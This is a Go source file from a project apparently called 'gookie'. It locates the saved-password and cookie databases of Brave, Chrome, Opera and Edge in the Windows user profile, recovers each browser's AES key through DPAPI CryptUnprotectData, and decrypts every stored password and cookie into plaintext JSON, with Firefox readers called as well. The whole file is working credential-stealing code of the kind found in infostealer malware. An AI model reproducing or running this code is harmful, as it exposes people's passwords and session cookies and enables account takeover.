package chromium

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"database/sql"
	"encoding/base64"
	"encoding/json"
	"errors"
	"fmt"
	"os"
	"path/filepath"
	"syscall"
	"unsafe"

	_ "github.com/mattn/go-sqlite3"
	"gookie/pkg/utils"
)

type Cookie struct {
	Name           string `json:"name"`
	Value          string `json:"value"`
	Domain         string `json:"domain"`
	Path           string `json:"path"`
	Expires        string `json:"expires"`
	IsExpired      bool   `json:"isExpired"`
	IsSecure       bool   `json:"isSecure"`
	HttpOnly       bool   `json:"httpOnly"`
	EncryptedValue []byte `json:"encryptedValue"`
}

type Password struct {
	URL               string `json:"url"`
	Username          string `json:"username"`
	PasswordDecrypted string `json:"passwordDecrypted"`
	PasswordEncrypted []byte `json:"passwordEncrypted"`
}

type JSONStruct struct {
	BravePasswords   []Password `json:"bravePasswords"`
	BraveCookies     []Cookie   `json:"braveCookies"`
	ChromePasswords  []Password `json:"chromePasswords"`
	ChromeCookies    []Cookie   `json:"chromeCookies"`
	OperaPasswords   []Password `json:"operaPasswords"`
	OperaCookies     []Cookie   `json:"operaCookies"`
	EdgePasswords    []Password `json:"edgePasswords"`
	EdgeCookies      []Cookie   `json:"edgeCookies"`
	FirefoxPasswords []Password `json:"firefoxPasswords"`
	FirefoxCookies   []Cookie   `json:"firefoxCookies"`
}

const (
	OperaCookiesPath  = "\\AppData\\Roaming\\Opera Software\\Opera Stable\\Network\\Cookies"
	EdgeCookiesPath   = "\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Network\\Cookies"
	BraveCookiesPath  = "\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Network\\Cookies"
	ChromeCookiesPath = "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Network\\Cookies"

	OperaPasswordPath  = "\\AppData\\Roaming\\Opera Software\\Opera Stable\\Login Data"
	EdgePasswordPath   = "\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Login Data"
	BravePasswordPath  = "\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Login Data"
	ChromePasswordPath = "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data"

	OperaKeyPath  = "\\AppData\\Roaming\\Opera Software\\Opera Stable\\Local State"
	EdgeKeyPath   = "\\AppData\\Local\\Microsoft\\Edge\\User Data\\Local State"
	BraveKeyPath  = "\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Local State"
	ChromeKeyPath = "\\AppData\\Local\\Google\\Chrome\\User Data\\Local State"

	ChromiumCookieQuery = `SELECT host_key as Domain, expires_utc as Expires, 
		is_httponly as HttpOnly, name as Name, path as Path, 
		is_secure as Secure, value as Value, encrypted_value as EncryptedValue 
		FROM cookies;`
	ChromiumPasswordQuery = `SELECT origin_url as URL, username_value as Username, password_value as Password FROM logins;`
)

var (
	DLLCrypt32  = syscall.NewLazyDLL("Crypt32.dll")
	DLLKernel32 = syscall.NewLazyDLL("Kernel32.dll")

	PCryptUnprotectData = DLLCrypt32.NewProc("CryptUnprotectData")
	PLocalFree          = DLLKernel32.NewProc("LocalFree")
	aesKey              []byte
)

type DataBlob struct {
	cbData uint32
	pbData *byte
}

func GetAllBrowserData() (JSONStruct, error) {
	bravePasswords, err := readChromiumPasswords(BravePasswordPath, BraveKeyPath)
	if err != nil {
		return JSONStruct{}, fmt.Errorf("readBravePasswords: %v", err)
	}

	braveCookies, err := readChromiumCookies(BraveCookiesPath, BraveKeyPath)
	if err != nil {
		return JSONStruct{}, fmt.Errorf("readBraveCookies: %v", err)
	}

	chromePasswords, err := readChromiumPasswords(ChromePasswordPath, ChromeKeyPath)
	if err != nil {
		return JSONStruct{}, fmt.Errorf("readChromePasswords: %v", err)
	}

	chromeCookies, err := readChromiumCookies(ChromeCookiesPath, ChromeKeyPath)
	if err != nil {
		return JSONStruct{}, fmt.Errorf("readChromeCookies: %v", err)
	}

	operaPasswords, err := readChromiumPasswords(OperaPasswordPath, OperaKeyPath)
	if err != nil {
		return JSONStruct{}, fmt.Errorf("readOperaPasswords: %v", err)
	}

	operaCookies, err := readChromiumCookies(OperaCookiesPath, OperaKeyPath)
	if err != nil {
		return JSONStruct{}, fmt.Errorf("readOperaCookies: %v", err)
	}

	edgePasswords, err := readChromiumPasswords(EdgePasswordPath, EdgeKeyPath)
	if err != nil {
		return JSONStruct{}, fmt.Errorf("readEdgePasswords: %v", err)
	}

	edgeCookies, err := readChromiumCookies(EdgeCookiesPath, EdgeKeyPath)
	if err != nil {
		return JSONStruct{}, fmt.Errorf("readEdgeCookies: %v", err)
	}

	firefoxPasswords, err := ReadFirefoxPasswords()
	if err != nil {
		return JSONStruct{}, fmt.Errorf("readFirefoxPasswords: %v", err)
	}

	firefoxCookies, err := ReadFirefoxCookies()
	if err != nil {
		return JSONStruct{}, fmt.Errorf("readFirefoxCookies: %v", err)
	}

	consolidated := JSONStruct{
		BravePasswords:   bravePasswords,
		BraveCookies:     braveCookies,
		ChromePasswords:  chromePasswords,
		ChromeCookies:    chromeCookies,
		EdgePasswords:    edgePasswords,
		EdgeCookies:      edgeCookies,
		FirefoxPasswords: firefoxPasswords,
		FirefoxCookies:   firefoxCookies,
		OperaPasswords:   operaPasswords,
		OperaCookies:     operaCookies,
	}

	return consolidated, nil
}

func newBlob(d []byte) *DataBlob {
	if len(d) == 0 {
		return &DataBlob{}
	}
	return &DataBlob{
		pbData: &d[0],
		cbData: uint32(len(d)),
	}
}

func (b *DataBlob) toByteArray() []byte {
	d := make([]byte, b.cbData)
	copy(d, (*[1 << 30]byte)(unsafe.Pointer(b.pbData))[:])
	return d
}

func decryptValue(data []byte) ([]byte, error) {
	if bytes.Equal(data[0:3], []byte{'v', '1', '0'}) {
		aesBlock, err := aes.NewCipher(aesKey)
		if err != nil {
			return nil, fmt.Errorf("error creating cipher block: %w", err)
		}

		aesGCM, err := cipher.NewGCM(aesBlock)
		if err != nil {
			return nil, fmt.Errorf("error creating GCM: %w", err)
		}

		nonce := data[3:15]
		encryptedData := data[15:]

		plaintext, err := aesGCM.Open(nil, nonce, encryptedData, nil)
		if err != nil {
			return nil, err
		}

		return plaintext, nil

	} else {
		var outBlob DataBlob
		r, _, err := PCryptUnprotectData.Call(uintptr(unsafe.Pointer(newBlob(data))), 0, 0, 0, 0, 0, uintptr(unsafe.Pointer(&outBlob)))
		if r == 0 {
			return nil, err
		}
		defer PLocalFree.Call(uintptr(unsafe.Pointer(outBlob.pbData)))

		return outBlob.toByteArray(), nil
	}
}

func readChromiumCookies(path, keyPath string) ([]Cookie, error) {
	osUser, err := os.UserHomeDir()
	if err != nil {
		return nil, err
	}
	cookiesPath := filepath.Join(osUser, path)

	dbConn, err := sql.Open("sqlite3", fmt.Sprintf("file:%s?cache=shared&mode=ro", cookiesPath))
	if err != nil {
		return nil, err
	}
	defer dbConn.Close()

	err = getAesGCMKey(keyPath)
	if err != nil {
		return nil, err
	}
	rows, err := dbConn.Query(ChromiumCookieQuery)
	if err != nil {
		return nil, err
	}
	defer rows.Close()

	var cookies []Cookie

	for rows.Next() {
		var cookie Cookie
		var expires, httpOnly, secure int64

		err = rows.Scan(&cookie.Domain, &expires, &httpOnly, &cookie.Name,
			&cookie.Path, &secure, &cookie.Value, &cookie.EncryptedValue)
		if err != nil {
			return nil, fmt.Errorf("error scanning row: %w", err)
		}

		cookie.Expires = utils.EpochToTime((expires / 1000000) - 11644473600)
		cookie.IsExpired = utils.IsExpired(expires)
		cookie.HttpOnly = utils.IntToBool(httpOnly)
		cookie.IsSecure = utils.IntToBool(secure)
		decrypted, err := decryptValue(cookie.EncryptedValue)
		if err != nil {
			return nil, fmt.Errorf("error decrypting: %w", err)
		}
		cookie.Value = string(decrypted)
		cookie.EncryptedValue = nil

		cookies = append(cookies, cookie)
	}
	return cookies, nil
}

func readChromiumPasswords(path, keyPath string) ([]Password, error) {
	osUser, err := os.UserHomeDir()
	if err != nil {
		return nil, err
	}
	passwordsPath := filepath.Join(osUser, path)

	dbConn, err := sql.Open("sqlite3", fmt.Sprintf("file:%s?cache=shared&mode=ro", passwordsPath))
	if err != nil {
		return nil, err
	}
	defer dbConn.Close()

	err = getAesGCMKey(keyPath)
	if err != nil {
		return nil, err
	}
	rows, err := dbConn.Query(ChromiumPasswordQuery)
	if err != nil {
		return nil, err
	}
	defer rows.Close()

	var passwords []Password

	for rows.Next() {
		var password Password

		err = rows.Scan(&password.URL, &password.Username, &password.PasswordEncrypted)
		if err != nil {
			return nil, fmt.Errorf("error scanning row: %w", err)
		}
		decrypted, err := decryptValue(password.PasswordEncrypted)
		if err != nil {
			return nil, err
		}
		password.PasswordDecrypted = string(decrypted)
		password.PasswordEncrypted = nil
		passwords = append(passwords, password)
	}
	return passwords, nil
}

func getAesGCMKey(keyPath string) error {
	osUser, err := os.UserHomeDir()
	if err != nil {
		return err
	}

	localStatePath := filepath.Join(osUser, keyPath)
	data, err := os.ReadFile(localStatePath)
	if err != nil {
		return err
	}

	var localState map[string]interface{}
	if err = json.Unmarshal(data, &localState); err != nil {
		return err
	}

	osCrypt, ok := localState["os_crypt"].(map[string]interface{})
	if !ok {
		return errors.New("os_crypt key not found in localState")
	}

	encryptedKeyStr, ok := osCrypt["encrypted_key"].(string)
	if !ok {
		return errors.New("encrypted_key not found in os_crypt")
	}

	encryptedKey, err := base64.StdEncoding.DecodeString(encryptedKeyStr)
	if err != nil {
		return err
	}

	if !bytes.Equal(encryptedKey[0:5], []byte{'D', 'P', 'A', 'P', 'I'}) {
		return errors.New("encrypted_key does not look like DPAPI key")
	}

	encryptedKey, err = decryptValue(encryptedKey[5:])
	if err != nil {
		return err
	}

	aesKey = encryptedKey

	return nil
}
